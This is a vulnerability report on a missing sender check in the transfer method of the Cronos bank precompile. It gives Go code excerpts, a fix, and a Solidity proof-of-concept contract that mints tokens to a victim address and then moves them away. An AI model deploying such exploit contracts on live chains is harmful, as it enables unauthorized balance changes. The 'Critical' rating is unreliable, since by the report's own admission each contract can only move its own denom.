### Title
Unauthorized Native Token Transfer via Bank Precompile Missing Sender Authorization — (`File: x/cronos/keeper/precompiles/bank.go`)

### Summary
The `transfer` method of the bank precompile (`BankContract.Run`) accepts an arbitrary `sender` address from calldata and executes `bankKeeper.SendCoins(ctx, from, to, ...)` without verifying that `sender == contract.Caller()`. Any EVM contract can therefore transfer `evm/<callerContract>` native bank-module tokens from any address to any address without the token holder's consent.

### Finding Description
In `x/cronos/keeper/precompiles/bank.go` the `TransferMethodName` case reads:

```go
sender := args[0].(common.Address)   // line 175 – taken from calldata, never validated
recipient := args[1].(common.Address)
amount := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
denom := EVMDenom(contract.Caller())  // line 186 – evm/<callerContract>
amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
    ...
    return bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))  // line 192
})
``` [1](#0-0) 

The `denom` is correctly scoped to `evm/<contract.Caller()>`, so a contract can only move tokens of its own denom. However, the `from` address is taken verbatim from the ABI-encoded calldata argument `sender` with no check that `sender == contract.Caller()`. The bank keeper's `SendCoins` enforces no EVM-level ownership; it simply moves coins between Cosmos accounts. There is no allowance or approval mechanism in the precompile.

The `mint` path has the same structural issue: `recipient` is caller-supplied and there is no check that the calling contract is the legitimate issuer of the denom, though for `mint` the impact is bounded to inflating the caller's own token supply.

For comparison, the `SendCroToIbcHandler` correctly guards its hook with an explicit allowlist check (`CroBridgeContractAddresses`), but the bank precompile has no analogous guard. [2](#0-1) 

### Impact Explanation
**Critical — Unauthorized transfer of `evm/<contract>` native tokens.**

Any unprivileged EVM contract can call `bank.transfer(victimAddress, attackerAddress, amount)`. The bank keeper executes `SendCoins(ctx, victim, attacker, coins)` unconditionally. This constitutes an unauthorized balance change for a native bank-module asset (`evm/…` denom), satisfying the Critical impact criterion: *unauthorized transfer of precompile-controlled assets*.

### Likelihood Explanation
**Medium.** The precompile is live at address `0x0000000000000000000000000000000000000064` and callable by any deployed contract. Exploitation requires that a victim holds `evm/<attackerContract>` tokens. This occurs whenever:
- A protocol uses the bank precompile to issue its own native token and users accumulate balances, or
- An attacker first calls `bank.mint(victim, amount)` to seed the victim's balance, then calls `bank.transfer(victim, attacker, amount)` to drain it.

The `TestBank.sol` integration contract demonstrates the intended pattern (`bank.transfer(msg.sender, recipient, amount)`), but the precompile itself enforces nothing. [3](#0-2) 

### Recommendation
In the `TransferMethodName` case, enforce that the `sender` argument equals the immediate EVM caller:

```go
if sender != contract.Caller() {
    return nil, errors.New("transfer: sender must be the calling contract")
}
```

Alternatively, remove the `sender` argument entirely and derive `from` from `contract.Caller()`, matching the semantics of every other privileged precompile operation in the codebase.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function mint(address, uint256) external payable returns (bool);
    function transfer(address, address, uint256) external payable returns (bool);
}

contract Exploit {
    IBankModule constant bank = IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: seed victim with evm/<this> tokens
    function seed(address victim, uint256 amount) external {
        bank.mint(victim, amount);
    }

    // Step 2: drain victim without any approval
    function drain(address victim, address attacker, uint256 amount) external {
        // sender = victim, but caller of bank precompile = address(this)
        // denom  = evm/<address(this)>
        // bankKeeper.SendCoins(victim, attacker, coins) executes unconditionally
        bank.transfer(victim, attacker, amount);
    }
}
```

1. Deploy `Exploit` at address `0xEXPLOIT`.
2. Call `seed(victim, 1000)` — victim now holds 1000 `evm/0xEXPLOIT` native tokens.
3. Call `drain(victim, attacker, 1000)` — the bank precompile calls `SendCoins(victim, attacker, 1000 evm/0xEXPLOIT)` with no authorization check on `victim`.
4. Victim's balance is zero; attacker holds 1000 tokens. No signature or approval from victim was required. [4](#0-3) [5](#0-4)

func (bc *BankContract) Run(evm *vm.EVM, contract *vm.Contract, readonly bool) ([]byte, error) {
	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())
		amt := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))
		err = stateDB.ExecuteNativeAction(precompileAddr, nil, func(ctx sdk.Context) error {
			if err := bc.bankKeeper.IsSendEnabledCoins(ctx, amt); err != nil {
				return err
			}
			if method.Name == "mint" {
				if err := bc.bankKeeper.MintCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")
				}
				if err := bc.bankKeeper.SendCoinsFromModuleToAccount(ctx, types.ModuleName, addr, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send mint coins to account")
				}
			} else {
				if err := bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to send burn coins to module")
				}
				if err := bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt)); err != nil {
					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")
				}
			}
			return nil
		})
		if err != nil {
			return nil, err
		}
		return method.Outputs.Pack(true)
